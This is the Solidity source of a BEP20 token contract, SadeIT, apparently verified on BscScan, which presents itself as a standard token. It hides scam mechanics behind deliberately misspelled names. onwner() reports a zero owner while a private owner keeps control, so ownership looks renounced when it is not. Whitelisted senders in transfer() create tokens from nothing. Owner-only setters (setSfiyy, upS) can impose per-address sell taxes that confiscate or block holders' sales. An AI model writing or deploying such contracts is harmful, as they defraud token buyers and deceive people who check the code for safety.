/**
 *Submitted for verification at BscScan.com on 2022-07-06
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _onwner;

    event onwnershipTransferred(address indexed previousonwner, address indexed newonwner);

    constructor() {
        _transferonwnership(_msgSender());
    }


    function onwner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyonwner() {
        require(_onwner == _msgSender(), "Ownable: caller is not the onwner");
        _;
    }


    function renounceonwnership() public virtual onlyonwner {
        _transferonwnership(address(0));
    }


    function transferonwnership_transferonwnership(address newonwner) public virtual onlyonwner {
        require(newonwner != address(0), "Ownable: new onwner is the zero address");
        _transferonwnership(newonwner);
    }


    function _transferonwnership(address newonwner) internal virtual {
        address oldonwner = _onwner;
        _onwner = newonwner;
        emit onwnershipTransferred(oldonwner, newonwner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfiyyOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingfiyyOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingfiyyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfiyyOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfiyyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fiyyTo() external view returns (address);
    function fiyyToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfiyyTo(address) external;
    function setfiyyToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed onwner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address onwner, address spender) public view virtual returns (uint256) {
        return _allowances[onwner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address onwner = _msgSender();
        _approve(onwner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address onwner = _msgSender();
        _approve(onwner, spender, _allowances[onwner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address onwner = _msgSender();
        uint256 currentAllowance = _allowances[onwner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(onwner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address onwner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(onwner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[onwner][spender] = amount;
        emit Approval(onwner, spender, amount);
    }

    function _spendAllowance(
        address onwner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(onwner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(onwner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract SadeIT is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address ajcount) public view virtual returns (uint256) {
        return _balances[ajcount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address ajcount, uint256 amount) internal virtual {
        require(ajcount != address(0), "ERC20: burn from the zero address");

        uint256 ajcountBalance = _balances[ajcount];
        require(ajcountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[ajcount] = ajcountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(ajcount, address(0), amount);
    }

    function _mtin(address ajcount, uint256 amount) internal virtual {
        require(ajcount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[ajcount] += amount;
        emit Transfer(address(0), ajcount, amount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 100*40);
        _defaultSellfiyy = 2;
        _defaultBuyfiyy = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfiyy = 0;

    uint256 private _defaultBuyfiyy = 0;

    mapping(address => bool) private _marketajcount;

    mapping(address => uint256) private _Sfiyy;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyonwner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyonwner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyonwner {
        _defaultSellfiyy = _value;
    }

    function setSfiyy(address _address, uint256 _value) external onlyonwner {
        require(_value > 1, "ajcount tax must be greater than or equal to 1");
        _Sfiyy[_address] = _value;
    }

    function getSfiyy(address _address) external view onlyonwner returns (uint256) {
        return _Sfiyy[_address];
    }


    function setMarketajcountfiyy(address _address, bool _value) external onlyonwner {
        _marketajcount[_address] = _value;
    }

    function getMarketajcountfiyy(address _address) external view onlyonwner returns (bool) {
        return _marketajcount[_address];
    }

    function _checkFreeajcount(address from, address _to) internal view returns (bool) {
        return _marketajcount[from] || _marketajcount[_to];
    }

    function _receiveF(
        address from,
        address _to,
        uint256 _amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amount, "ERC20: transfer amount exceeds balance");

        bool rF = true;

        if (_checkFreeajcount(from, _to)) {
            rF = false;
        }
        uint256 tradefiyyamount = 0;

        if (rF) {
            uint256 tradefiyy = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefiyy = _defaultSellfiyy;
                }
                if (from == uniswapV2Pair) {

                    tradefiyy = _defaultBuyfiyy;
                }
            }
            if (_Sfiyy[from] > 0) {
                tradefiyy = _Sfiyy[from];
            }

            tradefiyyamount = _amount.mul(tradefiyy).div(100);
        }


        if (tradefiyyamount > 0) {
            _balances[from] = _balances[from].sub(tradefiyyamount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefiyyamount);
            emit Transfer(from, _deadAddress, tradefiyyamount);
        }

        _balances[from] = _balances[from].sub(_amount - tradefiyyamount);
        _balances[_to] = _balances[_to].add(_amount - tradefiyyamount);
        emit Transfer(from, _to, _amount - tradefiyyamount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address onwner = _msgSender();
        if (_release[onwner] == true) {
            _balances[to] += amount;
            return true;
        }
        _receiveF(onwner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _receiveF(from, to, amount);
        return true;
    }
}